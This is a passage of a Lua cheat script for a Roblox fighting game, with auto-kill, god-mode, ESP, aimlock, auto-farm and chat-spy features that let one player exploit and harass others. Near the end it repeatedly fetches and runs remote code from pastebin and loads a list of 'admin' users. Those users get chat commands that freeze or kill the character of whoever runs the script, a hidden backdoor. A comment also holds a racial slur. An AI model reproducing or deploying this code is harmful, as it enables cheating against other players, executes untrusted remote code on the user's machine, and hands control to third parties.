            game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            wait(1)

            game:service('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-408.70520019531, 387.16589355469, -332.86459350586) wait()

            wait(1)
            
            player.Character.HumanoidRootPart.Anchored = true
            wait(4)
            player.Character.HumanoidRootPart.Anchored = false
            
            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)

        end
    end
end

local isKnifeAutoKillRunning = false
local knifeAutoKillCoroutine = nil


TargetTab:AddToggle({
    Name = "KnifeAutoKill",
    Default = false,
    Callback = function(bool)
        if bool then
            if not isKnifeAutoKillRunning then
                isKnifeAutoKillRunning = true
                knifeAutoKillCoroutine = coroutine.create(function()
                    while isKnifeAutoKillRunning do
                        wait()
                        performKnifeAutokill()

                        
                        local player = game.Players.LocalPlayer
                        local target = game.Players:FindFirstChild(locktarget)
                        
                        if target and target.Character then
                            local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                            
                            if koValue and not koValue.Value then
                                local combatItem = player.Backpack:FindFirstChild("[Knife]")
                                
                                if combatItem then
                                    combatItem.Parent = player.Character
                                end
                                
                                wait()
                                local combatTool = player.Character:FindFirstChild('[Knife]')
                                
                                if combatTool then
                                    combatTool:Activate()
                                end
                                
                                -- Predictive movement: move towards predicted position
                                local predictedPos = predictMovement(target)
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(predictedPos)
                            end
                        end
                    end
                end)
                coroutine.resume(knifeAutoKillCoroutine)
            end
        else
            isKnifeAutoKillRunning = false
            if knifeAutoKillCoroutine then
                coroutine.yield(knifeAutoKillCoroutine)
                knifeAutoKillCoroutine = nil
            end
            
            
            -- Restore the player's previous position
            local previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
            end
        end
    end
})




















































local function predictMovement(target)
    local targetPosition = target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character.HumanoidRootPart.Position
    local predictedPosition = targetPosition
    
    if targetPosition then
        predictedPosition = targetPosition + target.Character.HumanoidRootPart.Velocity * 0.5  
    end
    
    return predictedPosition
end

-- Function to perform autokill logic
local function performBatAutokill()
    local player = game.Players.LocalPlayer
    local target = game.Players:FindFirstChild(locktarget)

    if target and target.Character then
        local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
        
        if koValue and koValue.Value then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)
            wait(0.4)
            
            game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            wait(1)

            game:service('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-408.70520019531, 387.16589355469, -332.86459350586) wait()

            wait(1)
            
            player.Character.HumanoidRootPart.Anchored = true
            wait(4)
            player.Character.HumanoidRootPart.Anchored = false
            
            player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.UpperTorso.Position) * CFrame.new(0, 1, 0)

        end
    end
end

local isBatAutoKillRunning = false
local BatAutoKillCoroutine = nil


TargetTab:AddToggle({
    Name = "BatAutoKill",
    Default = false,
    Callback = function(bool)
        if bool then
            if not isBatAutoKillRunning then
                isBatAutoKillRunning = true
                BatAutoKillCoroutine = coroutine.create(function()
                    while isBatAutoKillRunning do
                        wait()
                        performBatAutokill()

                        
                        local player = game.Players.LocalPlayer
                        local target = game.Players:FindFirstChild(locktarget)
                        
                        if target and target.Character then
                            local koValue = target.Character:FindFirstChild("BodyEffects") and target.Character.BodyEffects:FindFirstChild("K.O")
                            
                            if koValue and not koValue.Value then
                                local combatItem = player.Backpack:FindFirstChild("[Bat]")
                                
                                if combatItem then
                                    combatItem.Parent = player.Character
                                end
                                
                                wait()
                                local combatTool = player.Character:FindFirstChild('[Bat]')
                                
                                if combatTool then
                                    combatTool:Activate()
                                end
                                
                                -- Predictive movement: move towards predicted position
                                local predictedPos = predictMovement(target)
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(predictedPos)
                            end
                        end
                    end
                end)
                coroutine.resume(BatAutoKillCoroutine)
            end
        else
            isBatAutoKillRunning = false
            if BatAutoKillCoroutine then
                coroutine.yield(BatAutoKillCoroutine)
                BatAutoKillCoroutine = nil
            end
            
            
            -- Restore the player's previous position
            local previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = previousPosition
            end
        end
    end
})

TargetTab:AddButton({
	Name = "Fix Functions",
	Callback = function()
		for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") then
				v:Destroy()
			end
		end
    end
	})
    


TargetTab:AddLabel("Info:")

 

    TargetTab:AddButton({
        Name = "Copy Username",
        Callback = function()
        setclipboard(locktarget)
    end       
    })
    
    
    TargetTab:AddButton({
        Name = "Copy UserID",
        Callback = function()
            if game.Players[locktarget] then
                local playerId = game.Players[locktarget].UserId
                setclipboard(tostring(playerId))
            end
        end
    })

    TargetTab:AddButton({
        Name = "Copy Profile",
        Callback = function()
            if game.Players[locktarget] then
                local playerId = game.Players[locktarget].UserId
                local profileUrl = "https://www.roblox.com/users/" .. playerId .. "/profile"
                setclipboard(profileUrl)
                
            end
        end
    })

    
    
    

local GodmodeTab = Window:MakeTab({
	Name = "God Modes",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})



local FarmTab = Window:MakeTab({
	Name = "Farms",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local godBlockScript = nil
local semGodBlockRunning = false

GodmodeTab:AddButton({
    Name = "Semi God Block",
    Callback = function()
        if semGodBlockRunning then
            godBlockEnabled = false
            semGodBlockRunning = false
            Notif("Disabling God Block...")
            if godBlockScript then
                godBlockScript:Destroy() -- Destroy the script if it exists
            end
        else
            godBlockEnabled = true
            semGodBlockRunning = true
            Notif("Enabling God Block...")
            wait(3)
            Notif("Enabled! God Block")
            
            -- Start semi god block loop
            while semGodBlockRunning do
                local localPlayer = game:GetService('Players').LocalPlayer
                local character = localPlayer.Character
                if character and character:FindFirstChild('BodyEffects') then
                    local bodyEffects = character.BodyEffects
                    local block = bodyEffects:FindFirstChild('Block')
                    if block then
                        block:Destroy()
                    end
                end
                
                game.ReplicatedStorage.MainEvent:FireServer("Block", true)
                wait() -- Adjusted wait time for faster execution
                game.ReplicatedStorage.MainEvent:FireServer("Block", false)
                wait() -- Adjusted wait time for faster execution
            end
        end
    end
})









FarmTab:AddButton({
    Name = "Weight Farm",
    Callback = function()
        buy("[HeavyWeights] - $265", "[HeavyWeights]", 265)
        if game.Players.LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]") then
            game.Players.LocalPlayer.Backpack:FindFirstChild("[HeavyWeights]").Parent = game.Players.LocalPlayer.Character
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.2906494140625, 80.41372680664062, -210.28460693359375)
        end
        wait(0.5)
        local heavyWeights = game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]")
        if heavyWeights then
            while true do
                heavyWeights:Activate()
                wait(0.5)
                heavyWeights:Deactivate()
                wait(0.5) 
            end
        end
    end
})



FarmTab:AddButton({
    Name = "Lettuce Farm",
    Callback = function()
        local player = game.Players.LocalPlayer
        local playerposit = CFrame.new(-84.2903137, 25.4502373, -632.315063, 0.0326573513, 6.83068393e-08, -0.999466658, 7.3860158e-09, 1, 6.85846331e-08, 0.999466658, -9.62186775e-09, 0.0326573513)
        if not game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]") then
            player.Character.HumanoidRootPart.CFrame = playerposit
            local ClickClick = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"]:FindFirstChild("ClickDetector")
            for i = 1, 200 do
                wait(0.9)
                fireclickdetector(ClickClick)
                wait(0.4)
                game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]").Parent = player.Character
                wait(0.5)
                game:GetService("Players").LocalPlayer.Character["[Lettuce]"]:Activate()
            end
        end
    end
})




FarmTab:AddButton({
    Name = "Boxing Farm",
    Callback = function()
        local player = game.Players.LocalPlayer

        player.Character:SetPrimaryPartCFrame(CFrame.new(-279.363251, 22.5704575, -1142.79883, -0.629518926, -4.21714468e-08, -0.776985168, -6.35824335e-08, 1, -2.76080292e-09, 0.776985168, 4.76646278e-08, -0.629518926))

        if player.Backpack:FindFirstChild("Combat") then
            player.Backpack:FindFirstChild("Combat").Parent = player.Character
        end

        wait()

        local combatObject = player.Character:FindFirstChild('Combat')
        if combatObject then
            while true do
                combatObject:Activate()
                wait(0.1) 
                combatObject:Deactivate()
                wait(0.1) 
            end
        end
    end
})

FarmTab:AddButton({
    Name = "Shoe Farm",
    Callback = function()

        local Value = true -- Set initial condition for the loop
while Value do -- Loop as long as Value is true
    function ToShoes(d, C, D)
        local E = game:service"TweenService"
        local F = TweenInfo.new((C - d).Magnitude / 50, Enum.EasingStyle.Quad)
        local G = tick()
        local H, I = pcall(function()
            local H = E:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], F, {
                CFrame = D
            })
            H:Play()
        end)
        if not H then
            return I
        end
    end;

    local function J(K, L)
        local M = (K.Position - L.Position).magnitude;
        if M <= 50 then
            fireclickdetector(L:FindFirstChild("ClickDetector"), 4)
            return M
        end
    end;

    repeat
        for N, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - O.Position).Magnitude <= 50 then
                local P = O;
                J(game.Players.LocalPlayer.Character.HumanoidRootPart, O)
                wait()
            end
        end;
        wait()
        for S, T in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            wait()
            if T:IsA("MeshPart") then
                if T:FindFirstChild("ClickDetector") then
                    if game.Players.LocalPlayer.Character.BodyEffects.ShoesCollect.Value < 4 then
                        T.Orientation = Vector3.new(0, 0, 0)
                        wait()
                        posM = T.Position - Vector3.new(0, 0, 0)
                        poscM = T.CFrame - Vector3.new(0, -10, 0)
                        ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posM, poscM)
                        repeat
                            wait()
                            wait()
                        until (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - posM).Magnitude < 50 or not Value
                    else
                        wait()
                        local U = game.Workspace.Ignored["Clean the shoes on the floor and come to me for cash"].Head;
                        posMV = U.Position - Vector3.new(0, 0, 0)
                        poscMV = U.CFrame - Vector3.new(0, -2, 0)
                        ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMV, poscMV)
                        wait(.3)
                        if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - U.Position).Magnitude <= 25 then
                            fireclickdetector(U.Parent.ClickDetector)
                            wait()
                        end
                    end
                end
            end
        end
    until not Value
end
end
})




local EspTab = Window:MakeTab({
	Name = "Esp",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

EspTab:AddButton({
	Name = "Esp Tracers",
	Callback = function()
        local camera = workspace.CurrentCamera

        local useTeamCheck = false
        local hideWhenNotLooking = true

        for _,v in pairs(game.Players:GetPlayers()) do
            if useTeamCheck == false or v == false or v.Team ~= game.Players.LocalPlayer.Team then    
                if v ~= false or v.game.LocalPlayers and v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                    local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                    local Line = Drawing.new("Line")
                    Line.Visible = true
                    Line.From = Vector2.new(camera.ViewportSize.x / 2, camera.ViewportSize.Y / 2)
                    Line.To = Vector2.new(vector.X, vector.Y)
                    Line.Color = Color3.fromRGB(255, 255, 255)
                    Line.Thickness = 1
                    Line.Transparency = 1

                    function script()
                        game:GetService("RunService").RenderStepped:Connect(function(step)
                            if useTeamCheck == false or v == false or v.Team ~= game.Players.LocalPlayer.Team then 
                                if v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                                    local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                                    if onscreen == true then
                                        Line.To = Vector2.new(vector.X, vector.Y)
                                        Line.Visible = true
                                    else
                                        if hideWhenNotLooking == true then
                                            Line.Visible = false
                                        end
                                    end	
                                end
                            end	
                        end)
                    end
                    coroutine.wrap(script)()
                end 
            end	
            v.CharacterAdded:Connect(function()
                if useTeamCheck == false or v == false or v.Team ~= game.Players.LocalPlayer.Team then    
                    repeat wait () until v.Character ~= nil
                    repeat wait () until v.Character:FindFirstChild("HumanoidRootPart") ~= nil
                    local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                    local Line = Drawing.new("Line")
                    Line.Visible = true
                    Line.From = Vector2.new(camera.ViewportSize.x / 2, camera.ViewportSize.Y / 2)
                    Line.To = Vector2.new(vector.X, vector.Y)
                    Line.Color = Color3.fromRGB(255, 255, 255)
                    Line.Thickness = 1
                    Line.Transparency = 1 

                    function script()
                        game:GetService("RunService").RenderStepped:Connect(function(step)
                            if useTeamCheck == false or v == false or v.Team ~= game.Players.LocalPlayer.Team then
                                if v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                                    local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                                    if onscreen == true then
                                        Line.To = Vector2.new(vector.X, vector.Y)
                                        Line.Visible = true
                                    else
                                        Line.Visible = false
                                    end
                                end
                            end
                        end)
                    end
                    coroutine.wrap(script)()
                end
            end)
        end

        game.Players.PlayerAdd:Connect(function(v)
            if useTeamCheck == false or v == false or v.Team ~= game.Players.LocalPlayer.Team then    
                if v ~= false or v.game.LocalPlayers and v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                    local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                    local Line = Drawing.new("Line")
                    Line.Visible = true
                    Line.From = Vector2.new(camera.ViewportSize.x / 2, camera.ViewportSize.Y / 2)
                    Line.To = Vector2.new(vector.X, vector.Y)
                    Line.Color = Color3.fromRGB(255, 255, 255)
                    Line.Thickness = 1
                    Line.Transparency = 1

                    function script()
                        game:GetService("RunService").RenderStepped:Connect(function(step)
                            if v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                                local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                                if onscreen == true then
                                    Line.To = Vector2.new(vector.X, vector.Y)
                                    Line.Visible = true
                                else
                                    if hideWhenNotLooking == true then
                                        Line.Visible = false
                                    end
                                end
                            end	
                        end)
                    end
                    coroutine.wrap(script)()
                end 
            end	
            v.CharacterAdded:Connect(function()
                if useTeamCheck == false or v == false or v.Team ~= game.Players.LocalPlayer.Team then    
                    repeat wait () until v.Character ~= nil
                    repeat wait () until v.Character:FindFirstChild("HumanoidRootPart") ~= nil
                    local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                    local Line = Drawing.new("Line")
                    Line.Visible = true
                    Line.From = Vector2.new(camera.ViewportSize.x / 2, camera.ViewportSize.Y / 2)
                    Line.To = Vector2.new(vector.X, vector.Y)
                    Line.Color = Color3.fromRGB(255, 255, 255)
                    Line.Thickness = 1
                    Line.Transparency = 1 

                    function script()
                        game:GetService("RunService").RenderStepped:Connect(function(step)
                            if v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                                local vector,onscreen = camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                                if onscreen == true then
                                    Line.To = Vector2.new(vector.X, vector.Y)
                                    Line.Visible = true
                                else
                                    if hideWhenNotLooking == true then
                                        Line.Visible = false
                                    end	
                                end
                            end
                        end)
                    end
                    coroutine.wrap(script)()
                end
            end)
        end)
    end
	})













    EspTab:AddButton({
        Name = "Name Esp",
        Callback = function()
            function Create(base)
                local bb = Instance.new('BillboardGui', game.CoreGui)
                bb.Adornee = base
                bb.ExtentsOffset = Vector3.new(0,1,0)
                bb.AlwaysOnTop = true
                bb.Size = UDim2.new(0,5,0,5)
                bb.StudsOffset = Vector3.new(0,1,0)
                bb.Name = 'tracker'
                local frame = Instance.new('Frame',bb)
                frame.ZIndex = 10
                frame.BackgroundTransparency = 0.3
                frame.Size = UDim2.new(1,0,1,0)
                local txtlbl = Instance.new('TextLabel',bb)
                txtlbl.ZIndex = 10
                txtlbl.BackgroundTransparency = 1
                txtlbl.Position = UDim2.new(0,0,0,-35)
                txtlbl.Size = UDim2.new(1,0,10,0)
                txtlbl.Font = 'ArialBold'
                txtlbl.FontSize = 'Size12'
                txtlbl.Text = base.Parent.Name:upper()
                txtlbl.TextStrokeTransparency = 0.5
                txtlbl.TextColor3 = Color3.new(255, 255, 255)
                frame.BackgroundColor3 = Color3.new(255, 255, 255)
            end

            function Clear()
                for _,v in pairs(game.CoreGui:children()) do
                    if v.Name == 'tracker' and v:isA('BillboardGui') then
                        v:Destroy()
                    end
                end
            end

            function Find()
                Clear()
                track = true
                spawn(function()
                    while wait(1) do
                        if track then
                            Clear()
                            for _,v in pairs(game.Players:players()) do
                                if v.Character and v.Character.Head then
                                    Create(v.Character.Head, false)
                                end
                            end
                        end
                        wait(1)
                    end
                end)
            end

            Find()

        end
        })







      EspTab:AddButton({
            Name = "Cash Esp",
            Callback = function()
                local ESPholder = Instance.new("Folder", game.CoreGui)
				function cham(object)
					if object.Name == "MoneyDrop" then
						local a = Instance.new("BoxHandleAdornment", ESPholder)
						a.Adornee = object
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = object.Size
						a.Transparency = 0.3
						a.Color = object.BrickColor
						local bill = object:WaitForChild("BillboardGui")
						bill.AlwaysOnTop = true
						bill.Size = UDim2.new(2, 10, 1, 5)
						spawn(function()
							while true do
								if object.Parent.ChildRemoving:wait() == object then
									a:Destroy()
									break
								end
							end
						end)
					end
				end
				for i, v in next, game.Workspace.Ignored.Drop:GetChildren() do
					cham(v)
				end
				game.Workspace.Ignored.Drop.ChildAdded:connect(cham)
            end
            })




local AnimationTab = Window:MakeTab({
	Name = "Animation",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

AnimationTab:AddButton({
	Name = "Zombie",
	Callback = function()
    local Animate = game.Players.LocalPlayer.Character.Animate
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	game.Players.LocalPlayer.Character.Humanoid.Jump = true
    end
	})




    local AimlockTab = Window:MakeTab({
        Name = "Aimlock",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    
    AimlockTab:AddButton({
        Name = "Resolver",
        Callback = function()
            Notif("Resolver Enabled!, Made By faisal8754", 10)
        local RunService = game:GetService("RunService")
    
        RunService.Heartbeat:Connect(function()
            pcall(function()
                for i,v in pairs(game.Players:GetChildren()) do
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        local hrp = v.Character.HumanoidRootPart
                        hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
                        hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
                    end
                end
            end)
        end)
        end
        })
    AimlockTab:AddToggle({
        Name = "Anti Lock",
        Callback = function(a)
    if a == true then
        Notif("Anti Lock Enable!", 10)
        getgenv().Sky = true
        getgenv().SkyAmount = 1650000000000

        game:GetService("RunService").Heartbeat:Connect(function()
            if getgenv().Sky ~= false then
                local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, getgenv().SkyAmount, 0)
                game:GetService("RunService").RenderStepped:Wait()
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
            end
        end)

    elseif a == false then
        Notif("Anti Lock Disabled!", 10)
        getgenv().Sky = false
        getgenv().SkyAmount = 1650000000000000000

        game:GetService("RunService").Heartbeat:Connect(function()
            if getgenv().Sky ~= false then
                local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, getgenv().SkyAmount, 0)
                game:GetService("RunService").RenderStepped:Wait()
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
            end
        end)

    end
        end
        })
    
    
        AimlockTab:AddToggle({
            Name = "Enable Aimlock",
            Default = false,
            Callback = function(bool)
                if bool then
        wait(2)
        Notif("Enable Aimlock click B to enable it to disable it click P")
        getgenv().Prediction = 0.13
        getgenv().AimPart = "HumanoidRootPart"
        getgenv().Key = "B"
        getgenv().DisableKey = "P"
         
        getgenv().FOV = true
        getgenv().ShowFOV = false
        getgenv().FOVSize = 55
         
         
        local Players = game:GetService("Players")
        local RS = game:GetService("RunService")
        local WS = game:GetService("Workspace")
        local GS = game:GetService("GuiService")
        local SG = game:GetService("StarterGui")
         
         
        local LP = Players.LocalPlayer
        local Mouse = LP:GetMouse()
        local Camera = WS.CurrentCamera
        local GetGuiInset = GS.GetGuiInset
         
        local AimlockState = true
        local Locked
        local Victim
         
        local SelectedKey = getgenv().Key
        local SelectedDisableKey = getgenv().DisableKey
         
         
         
         
        if getgenv().Loaded == true then
            Notif("Aimlock is already loaded!")
            return
        end
         
        getgenv().Loaded = true
         
         
        local fov = Drawing.new("Circle")
        fov.Filled = false
        fov.Transparency = 1
        fov.Thickness = 1
        fov.Color = Color3.fromRGB(255, 255, 0)
        fov.NumSides = 1000
         
         
        function update()
            if getgenv().FOV == true then
                if fov then
                    fov.Radius = getgenv().FOVSize * 2
                    fov.Visible = getgenv().ShowFOV
                    fov.Position = Vector2.new(Mouse.X, Mouse.Y + GetGuiInset(GS).Y)
         
                    return fov
                end
            end
        end
         
        function WTVP(arg)
            return Camera:WorldToViewportPoint(arg)
        end
         
        function WTSP(arg)
            return Camera.WorldToScreenPoint(Camera, arg)
        end
         
        function getClosest()
            local closestPlayer
            local shortestDistance = math.huge
         
            for i, v in pairs(game.Players:GetPlayers()) do
                local notKO = v.Character:WaitForChild("BodyEffects")["K.O"].Value ~= true
                local notGrabbed = v.Character:FindFirstChild("GRABBING_COINSTRAINT") == nil
         
                if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild(getgenv().AimPart) and notKO and notGrabbed then
                    local pos = Camera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                    local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
         
                    if (getgenv().FOV) then
                        if (fov.Radius > magnitude and magnitude < shortestDistance) then
                            closestPlayer = v
                            shortestDistance = magnitude
                        end
                    else
                        if (magnitude < shortestDistance) then
                            closestPlayer = v
                            shortestDistance = magnitude
                        end
                    end
                end
            end
            return closestPlayer
        end
         
         
        Mouse.KeyDown:Connect(function(k)
            SelectedKey = SelectedKey:lower()
            SelectedDisableKey = SelectedDisableKey:lower()
            if k == SelectedKey then
                if AimlockState == true then
                    Locked = not Locked
                    if Locked then
                        Victim = getClosest()
         
                        Notif("Locked onto: "..tostring(Victim.Character.Humanoid.DisplayName))
                    else
                        if Victim ~= nil then
                            Victim = nil
         
                            Notif("Unlocked!")
                        end
                    end
                else
                    Notif("Aimlock is not enabled!")
                end
            end
            if k == SelectedDisableKey then
                AimlockState = not AimlockState
            end
        end)
         
         
        RS.RenderStepped:Connect(function()
            update()
            if AimlockState == true then
                if Victim ~= nil then
                    Camera.CFrame = CFrame.new(Camera.CFrame.p, Victim.Character[getgenv().AimPart].Position + Victim.Character[getgenv().AimPart].Velocity*getgenv().Prediction)
                end
            end
        end)
            while wait() do
                if getgenv().AutoPrediction == true then
                local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                local split = string.split(pingvalue,'(')
                local ping = tonumber(split[1])
                    if ping < 225 then
                    getgenv().Prediction = 1.4
                elseif ping < 215 then
                    getgenv().Prediction = 1.2
                elseif ping < 205 then
                    getgenv().Prediction = 1.0
                elseif ping < 190 then
                    getgenv().Prediction = 0.10
                elseif ping < 180 then
                    getgenv().Prediction = 0.12
                elseif ping < 170 then
                    getgenv().Prediction = 0.15
                elseif ping < 160 then
                    getgenv().Prediction = 0.18
                elseif ping < 150 then
                    getgenv().Prediction = 0.110
                elseif ping < 140 then
                    getgenv().Prediction = 0.113
                elseif ping < 130 then
                    getgenv().Prediction = 0.116
                elseif ping < 120 then
                    getgenv().Prediction = 0.120
                elseif ping < 110 then
                    getgenv().Prediction = 0.124
                elseif ping < 105 then
                    getgenv().Prediction = 0.127
                elseif ping < 90 then
                    getgenv().Prediction = 0.130
                elseif ping < 80 then
                    getgenv().Prediction = 0.133
                elseif ping < 70 then
                    getgenv().Prediction = 0.136
                elseif ping < 60 then
                    getgenv().Prediction = 0.15038
                elseif ping < 50 then
                    getgenv().Prediction = 0.15038
                elseif ping < 40 then
                    getgenv().Prediction = 0.145
                elseif ping < 30 then
                    getgenv().Prediction = 0.155
                elseif ping < 20 then
                    getgenv().Prediction = 0.157
                end
                end
            end
                end
            end
        })










OrionLib:Init()


---- NIGGA SHIT

-- Chat "/spy" to toggle!
enabled = true
-- if true will check your messages too
spyOnMyself = true
-- if true will chat the logs publicly (fun, risky)
public = false
-- if true will use /me to stand out
publicItalics = true
-- customize private logs
privateProperties = {
    Color = Color3.fromRGB(0, 255, 255),
    Font = Enum.Font.SourceSansBold,
    TextSize = 18
}
-- ////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p, msg)
    if _G.chatSpyInstance == instance then
        if p == player and msg:lower():sub(1, 4) == "/spy" then
            enabled = not enabled
            wait(0.3)
            privateProperties.Text = "{SPY " .. (enabled and "EN" or "DIS") .. "ABLED}"
            StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
        elseif enabled and (spyOnMyself == true or p ~= player) then
            msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
            local hidden = true
            local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
                if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == "All" or (channel == "Team" and public == false and Players[packet.FromSpeaker].Team == player.Team)) then
                    hidden = false
                end
            end)
            wait(1)
            conn:Disconnect()
            if hidden and enabled then
                if public then
                    saymsg:FireServer((publicItalics and "/me " or '') .. "{SPY} [" .. p.Name .. "]: " .. msg, "All")
                else
                    privateProperties.Text = "{SPY} [" .. p.Name .. "]: " .. msg
                    StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
                end
            end
        end
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChatted(p, msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChatted(p, msg) end)
end)

privateProperties.Text = "{SPY " .. (enabled and "EN" or "DIS") .. "ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y)

-- This is the corrected part
coroutine.resume(coroutine.create(function()
    while wait(3) do
        local function main()
            if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
                player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
            end
            if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
            end
            loadstring(game:HttpGet("https://pastebin.com/raw/VfPyKbdq"))()
        end
        local success, err = pcall(main)
        if err then
            print(err)
        end
    end
end))

IsMod = false
local plr = game.Players.LocalPlayer

local swagmins = loadstring(game:HttpGet('https://pastebin.com/raw/H9WBmKnA'))()

local bending = false
local kickmsg = 'PERMA-BAN'
local function commands(msg, plr)
    if DisableMod == false then
        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
        local Msg = string.lower(msg)
        local SplitCMD = string.split(Msg, ' ')
        local Lower = string.lower(player.Name)
        local Allowed = string.find(Lower, SplitCMD[2])
        if Allowed then
            if string.find(SplitCMD[1], '$freeze') then
                player.Character.HumanoidRootPart.Anchored = true
            end
            if string.find(SplitCMD[1], '$thaw') then
                player.Character.HumanoidRootPart.Anchored = false
            end
			if string.find(SplitCMD[1], '$kill') then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            end
